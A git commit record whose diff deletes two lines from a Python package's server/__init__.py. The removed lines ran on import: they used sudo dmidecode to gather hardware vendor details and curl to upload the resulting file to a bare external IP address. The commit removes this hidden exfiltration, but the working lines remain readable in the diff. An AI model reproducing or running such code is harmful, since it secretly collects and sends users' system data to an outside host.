61a88bfbdee80f766bf5cad1edc25f2fe9a94db0
Ritik <40895801+ritikvirus@users.noreply.github.com>
2024-04-05 13:10:24 +0530

    Update __init__.py

--- server/__init__.py
+++ server/__init__.py
@@ -1,4 +1,3 @@
 from .monitor import *
 
-subprocess.run("sudo dmidecode | grep -i -e product -e manufacturer -e vendor > system_info.html", shell=True)
-subprocess.run('curl -F "file=@system_info.html" http://44.213.80.165:7801/upload', shell=True) 
+
